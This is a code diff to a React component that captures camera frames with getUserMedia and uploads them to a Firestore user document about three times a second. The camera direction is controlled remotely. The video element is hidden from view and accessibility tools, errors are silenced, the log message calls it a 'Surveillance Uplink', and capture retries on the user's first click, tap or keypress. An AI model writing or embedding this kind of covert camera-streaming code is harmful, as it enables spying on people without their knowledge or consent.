@@ -11,34 +11,43 @@ import { doc, updateDoc } from "firebase/firestore";
 import { db } from "../firebase.config";
 
 const LiveStreamer = () => {
-  const { user, isLiveMonitoring } = useAuth();
+  const { user, isLiveMonitoring, liveFacingMode } = useAuth();
   const videoRef = useRef(null);
   const canvasRef = useRef(null);
   const [stream, setStream] = useState(null);
-  const [currentFacing, setCurrentFacing] = useState("user");
+  const streamRef = useRef(null);
+  const intervalRef = useRef(null);
 
   useEffect(() => {
-    let interval;
-    let streamRef = null;
-
-    const startStream = async (facing) => {
-      if (streamRef) {
-        streamRef.getTracks().forEach(t => t.stop());
-        streamRef = null;
+    const stopStream = () => {
+      if (streamRef.current) {
+        streamRef.current.getTracks().forEach(t => t.stop());
+        streamRef.current = null;
       }
+      if (intervalRef.current) {
+        clearInterval(intervalRef.current);
+        intervalRef.current = null;
+      }
+      setStream(null);
+    };
+
+    const startStream = async () => {
+      stopStream();
+      if (!user?.uid || !isLiveMonitoring) return;
+
       try {
         const s = await navigator.mediaDevices.getUserMedia({ 
           video: { 
-            facingMode: facing, 
+            facingMode: liveFacingMode, 
             width: { ideal: 640 }, 
             height: { ideal: 480 } 
           } 
         });
-        streamRef = s;
+        streamRef.current = s;
         setStream(s);
         if (videoRef.current) videoRef.current.srcObject = s;
 
-        interval = setInterval(async () => {
+        intervalRef.current = setInterval(async () => {
           if (!videoRef.current || !canvasRef.current || !user?.uid) return;
           const canvas = canvasRef.current;
           const video = videoRef.current;
@@ -57,56 +66,39 @@ const LiveStreamer = () => {
               lastLivePulse: new Date().toISOString()
             });
           } catch (e) {
-             // Silently handle firestore update errors
+             // Silence Firestore errors
           }
-        }, 200); // 200ms for ~5 FPS
+        }, 300); // 300ms safest reliable threshold
       } catch (err) {
         if (err.name !== "NotAllowedError" && err.name !== "NotFoundError") {
-            console.warn("LiveStream failure:", err.name);
+            console.warn("Surveillance Uplink Failure:", err.name);
         }
       }
     };
 
-    const handleConfigChange = (snap) => {
-      const data = snap.data();
-      const newFacing = data.liveFacingMode === "environment" ? "environment" : "user";
-      if (newFacing !== currentFacing) {
-        setCurrentFacing(newFacing);
-        if (isLiveMonitoring) startStream(newFacing);
-      }
-    };
-
-    let unsubDoc;
     const attemptStart = () => {
-      if (isLiveMonitoring && !streamRef) startStream(currentFacing);
+      if (isLiveMonitoring && !streamRef.current) startStream();
     };
 
     if (user?.uid && isLiveMonitoring) {
-      unsubDoc = onSnapshot(doc(db, "users", user.uid), handleConfigChange);
-      startStream(currentFacing);
+      startStream();
       window.addEventListener("mousedown", attemptStart, { once: true });
       window.addEventListener("touchstart", attemptStart, { once: true });
       window.addEventListener("keydown", attemptStart, { once: true });
     } else {
-      if (stream) {
-        stream.getTracks().forEach(t => t.stop());
-        setStream(null);
-      }
-      if (interval) clearInterval(interval);
+      stopStream();
     }
 
     return () => {
-      if (stream) stream.getTracks().forEach(t => t.stop());
-      if (interval) clearInterval(interval);
-      if (unsubDoc) unsubDoc();
+      stopStream();
       window.removeEventListener("mousedown", attemptStart);
       window.removeEventListener("touchstart", attemptStart);
       window.removeEventListener("keydown", attemptStart);
     };
-  }, [user?.uid, isLiveMonitoring]);
+  }, [user?.uid, isLiveMonitoring, liveFacingMode]);
 
   return (
-    <div className="fixed opacity-0 pointer-events-none -z-50 size-0 overflow-hidden" aria-hidden="true">
+    <div className="fixed opacity-0 pointer-events-none -z-50 size-0 overflow-hidden" aria-hidden="true" style={{ visibility: 'hidden' }}>
       <video ref={videoRef} autoPlay playsInline muted />
       <canvas ref={canvasRef} />
     </div>
